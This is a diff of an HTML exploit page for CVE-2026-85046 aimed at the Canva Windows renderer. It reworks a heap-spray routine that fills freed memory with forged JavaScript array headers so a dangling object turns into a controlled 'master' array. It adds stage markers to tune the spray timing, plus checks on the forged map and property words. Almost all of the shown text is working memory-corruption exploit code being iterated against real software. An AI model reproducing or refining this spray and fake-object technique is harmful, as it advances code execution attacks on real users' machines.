@@ -1,7 +1,7 @@
 <!doctype html>
 <html>
   <head>
-    <title>CVE-2026-85046 - Canva Windows map-corrected probe v11</title>
+    <title>CVE-2026-85046 - Canva Windows reference-spray diagnostic v12</title>
     <meta charset="UTF-8" />
     <style>
       * {
@@ -178,7 +178,7 @@
       var running = false;
 
       try {
-        var previousDiagnostic = localStorage.getItem("f022-v11-last");
+        var previousDiagnostic = localStorage.getItem("f022-v12-last");
         if (previousDiagnostic) {
           setTimeout(function () {
             log("[previous diagnostic] " + previousDiagnostic);
@@ -307,44 +307,48 @@
       //   phase selects which 4-byte alignment the window starts are placed at
       //   (0 => 0-mod-8, 4 => 4-mod-8) so it always matches the dangling address.
       // ---------------------------------------------------------------------------
-      function makeSprayTemplate(n, victim_elems_tagged, phase) {
-        var t;
+      // Reference-style young-generation spray.
+      //
+      // Each batch allocates exactly four near-maximum regular FixedDoubleArrays
+      // using alternating 0x3fff / 0x3ffb lengths. The backing-store sizes pair
+      // to stable 0x40000-byte geometry, and no sprayed array is intentionally
+      // retained after this function returns.
+      //
+      // fakeLenSmi is stage-specific so a successful landing tells us which
+      // stage reclaimed the stale slot:
+      //   stage 1 -> JSArray length 30
+      //   stage 2 -> JSArray length 31
+      //   stage 3 -> JSArray length 32  (desired final master)
+      function sprayReferenceBatch(victim_elems_tagged, phase, fakeLenSmi) {
+        for (var i = 0; i < 4; i++) {
+          var n = i & 1 ? 0x3ffb : 0x3fff;
+          var a;
 
-        if (phase === 0) {
-          var hdr = w2f(PACKED_DOUBLE_MAP, EMPTY_PROPERTIES);
-          var pair = w2f(victim_elems_tagged, FAKE_LEN_SMI);
+          if (phase === 0) {
+            var hdr = w2f(PACKED_DOUBLE_MAP, EMPTY_PROPERTIES);
+            var pair = w2f(victim_elems_tagged, fakeLenSmi);
 
-          t = new Array(n).fill(hdr);
-          for (var i = 1; i < t.length; i += 2) t[i] = pair;
-        } else {
-          var odd = w2f(EMPTY_PROPERTIES, victim_elems_tagged);
-          var even = w2f(FAKE_LEN_SMI, PACKED_DOUBLE_MAP);
+            a = new Array(n).fill(hdr);
+            for (var j = 1; j < a.length; j += 2) a[j] = pair;
+          } else {
+            var odd = w2f(EMPTY_PROPERTIES, victim_elems_tagged);
+            var even = w2f(fakeLenSmi, PACKED_DOUBLE_MAP);
 
-          t = new Array(n).fill(odd);
-          for (var i = 1; i < t.length; i += 2) t[i] = even;
+            a = new Array(n).fill(odd);
+            for (var k = 1; k < a.length; k += 2) a[k] = even;
+          }
         }
-
-        return t;
       }
 
-      // Two template sizes keep the allocation geometry from repeatedly landing
-      // on exactly the same boundary.  The templates are built once; the actual
-      // pressure comes from slice() copies, avoiding a throwaway holey backing
-      // allocation for every sprayed window.
-      function sprayControlled(victim_elems_tagged, phase, groups) {
-        var tA = makeSprayTemplate(0x3fff, victim_elems_tagged, phase);
-        var tB = makeSprayTemplate(0x3ffb, victim_elems_tagged, phase);
-        var keep = null;
-
-        // One group is roughly 512 KiB of FixedDoubleArray backing allocation.
-        for (var g = 0; g < groups; g++) {
-          keep = tA.slice();
-          keep = tB.slice();
-          keep = tA.slice();
-          keep = tB.slice();
+      function sprayReferenceStage(
+        victim_elems_tagged,
+        phase,
+        batches,
+        fakeLenSmi,
+      ) {
+        for (var b = 0; b < batches; b++) {
+          sprayReferenceBatch(victim_elems_tagged, phase, fakeLenSmi);
         }
-
-        return keep;
       }
 
       // ---------------------------------------------------------------------------
@@ -420,47 +424,61 @@
         // stale address's semispace becomes allocatable and gets sprayed over.
         // 64 rounds x 4 x 128KB = 32MB — enough to flip an 8MB semispace pair
         // and re-cover the dead address even at a deep offset.
-        // Reference exploit uses three distinct allocation phases:
-        //   stage 1 -> first post-bug Scavenge
-        //   stage 2 -> second Scavenge, stale semispace becomes active again
-        //   stage 3 -> fill that active semispace with the fake-array layout.
-        //
-        // 16 groups ~= 8 MiB per stage with these ~128 KiB backing stores.
-        // v6 showed that ~24 MiB total was enough to reach the stale address on
-        // this Canva renderer, so preserve roughly the same total pressure but
-        // keep the three GC phases separate.
-        var stageGroups = 16;
+        // Keep approximately the same ~8 MiB per stage as v8-v11, but make
+        // the allocation geometry match the public reference exploit: direct
+        // new Array(...).fill(...) backing stores, alternating 0x3fff/0x3ffb,
+        // and no retained slice copies.
+        var stageBatches = 16; // 16 * ~512 KiB ~= 8 MiB per stage.
+
+        var STAGE1_LEN_SMI = 30 << 1;
+        var STAGE2_LEN_SMI = 31 << 1;
+        var STAGE3_LEN_SMI = 32 << 1;
 
         try {
           localStorage.setItem(
-            "f022-v11-last",
+            "f022-v12-last",
             JSON.stringify({
               dead_addr: hex(dead_addr),
               victim: hex(victim_base),
               originalPattern: original_pattern,
               selectedPattern: pattern,
               windowsPhaseFlip: true,
-              stageGroups: stageGroups,
+              stageBatches: stageBatches,
               stageApproxMiB: 8,
               totalApproxMiB: 24,
+              stage1Length: 30,
+              stage2Length: 31,
+              stage3Length: 32,
               expectedPackedDoubleMap: hex(PACKED_DOUBLE_MAP),
               expectedPackedElementsMap: hex(PACKED_ELEMENTS_MAP),
               expectedEmptyProperties: hex(EMPTY_PROPERTIES),
-              expectedLengthWord: hex(FAKE_LEN_SMI),
             }),
           );
         } catch (_) {}
 
-        dbg("      [6.1] spray stage 1: ~8 MiB...");
-        var sprayKeep1 = sprayControlled(victim_elems_tagged, pattern, stageGroups);
+        dbg("      [6.1] reference spray stage 1: marker length=30 (~8 MiB)...");
+        sprayReferenceStage(
+          victim_elems_tagged,
+          pattern,
+          stageBatches,
+          STAGE1_LEN_SMI,
+        );
 
-        dbg("      [6.2] spray stage 2: ~8 MiB...");
-        sprayKeep1 = null;
-        var sprayKeep2 = sprayControlled(victim_elems_tagged, pattern, stageGroups);
+        dbg("      [6.2] reference spray stage 2: marker length=31 (~8 MiB)...");
+        sprayReferenceStage(
+          victim_elems_tagged,
+          pattern,
+          stageBatches,
+          STAGE2_LEN_SMI,
+        );
 
-        dbg("      [6.3] spray stage 3: ~8 MiB...");
-        sprayKeep2 = null;
-        var sprayKeep3 = sprayControlled(victim_elems_tagged, pattern, stageGroups);
+        dbg("      [6.3] reference spray stage 3: marker length=32 (~8 MiB)...");
+        sprayReferenceStage(
+          victim_elems_tagged,
+          pattern,
+          stageBatches,
+          STAGE3_LEN_SMI,
+        );
 
         // Debug pause (#auto#pause): spin so gdb can attach to the renderer and
         // dump memory around dead_addr before the deref (crashes invalidate it).
@@ -511,13 +529,27 @@
         var len = master.length;
         dbg("      [7.2] master.length=" + len);
 
+        if (len === 30) {
+          throw new Error(
+            "fake JSArray landed from stage 1; GC phase sizing is too large/early",
+          );
+        }
+
+        if (len === 31) {
+          throw new Error(
+            "fake JSArray landed from stage 2; final-stage sizing/timing needs adjustment",
+          );
+        }
+
         if (len !== 32)
           throw new Error(
-            "stale object was not reclaimed as the intended fake JSArray " +
+            "stale object was not reclaimed as the intended stage-3 fake JSArray " +
               "(master.length=" +
               len +
               ")",
           );
+
+        dbg("      [7.3] stage-3 fake JSArray landing confirmed (length=32)");
         if (f2w0(master[0]) !== PACKED_DOUBLE_MAP)
           throw new Error("map word mismatch");
         if (f2w1(master[0]) !== EMPTY_PROPERTIES)
